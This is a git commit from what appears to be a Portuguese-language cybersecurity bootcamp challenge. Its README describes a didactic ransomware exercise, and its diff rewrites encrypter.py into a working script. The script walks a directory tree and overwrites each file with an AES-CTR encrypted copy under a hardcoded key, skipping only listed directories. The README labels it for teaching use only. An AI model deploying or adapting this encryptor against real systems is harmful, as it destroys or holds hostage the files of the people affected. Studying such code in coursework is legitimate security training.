0637d2283157e985a3e466c0c926281614bfc84c
Jonathas Gabriel Davide Tenorio <2009641@aluno.univesp.br>
2023-12-11 21:55:46 -0300

    upgrade
    Upgrade desafio de código bootcamp Cibersegurança da DIO

--- README.md
+++ README.md
@@ -1,2 +1,10 @@
 # desafio-modulo2-cibersecurity
 Código para o desafio de projeto do Módulo 2 da trilha de Cibersegurança.
+
+## Instruções
+
+O encrypter.py irá criptografar todos os arquivos dentro de um diretório raiz, necessitando apenas definir o caminho do diretório
+Editar o arquivo encrypter e passar os diretórios que serão evitados na hora da criptografia (evitar diretórios importantes para a funcionalidade do S.O.)
+Editar o decrypter para evitar verificação em diretórios não afetados e otimizar o tempo.
+
+Fins apenas didáticos, não utilizar para fins maliciosos. 
--- encrypter.py
+++ encrypter.py
@@ -1,22 +1,43 @@
 import os
 import pyaes
 
-## abrir o arquivo criptografado
-file_name = "teste.txt.ransomwaretroll"
-file = open(file_name, "rb")
-file_data = file.read()
-file.close()
+# chave de criptografia
+chave = b"testeransomwares"  # Ajuste para 16, 24 ou 32 bytes
 
-## chave para descriptografia
-key = b"testeransomwares"
-aes = pyaes.AESModeOfOperationCTR(key)
-decrypt_data = aes.decrypt(file_data)
+def criptografa(key, input_file):
+    # Abrir o arquivo a ser criptografado
+    aes = pyaes.AESModeOfOperationCTR(chave)
 
-## remover o arquivo criptografado
-os.remove(file_name)
+    with open(input_file, 'rb') as fileOpen:
+        file_data = fileOpen.read()
 
-## criar o arquivo descriptografado
-new_file = "teste.txt"
-new_file = open(f'{new_file}', "wb")
-new_file.write(decrypt_data)
-new_file.close()
+    # Criptografar o arquivo
+    crypto_data = aes.encrypt(file_data)
+
+    # Salvar o arquivo criptografado
+    with open(input_file, 'wb') as fileClose:
+        fileClose.write(crypto_data)
+
+def listar_arquivos_diretorios(diretorio, diretorios_a_pular=None):
+    if diretorios_a_pular is None:
+        diretorios_a_pular = []
+
+    for root, dirs, files in os.walk(diretorio):
+       
+       # Verifica se o diretório deve ser pulado
+        if any(nome in root for nome in diretorios_a_pular):
+            continue
+
+         # Listar diretórios
+        print(f"Diretório: {root}")
+
+        # Listar arquivos
+        for file in files:
+            caminho_completo = os.path.join(root, file)
+            criptografa(chave, caminho_completo)
+            print(f"Arquivo criptografado: {caminho_completo}")
+#
+# Substitua '/caminho/do/seu/diretorio' pelo caminho real do diretório que você deseja começar
+caminho_do_diretorio = '/caminho/do/seu/diretorio'
+diretorios_a_pular = ['diretório', 'que será','desconsiderado']
+listar_arquivos_diretorios(caminho_do_diretorio, diretorios_a_pular)
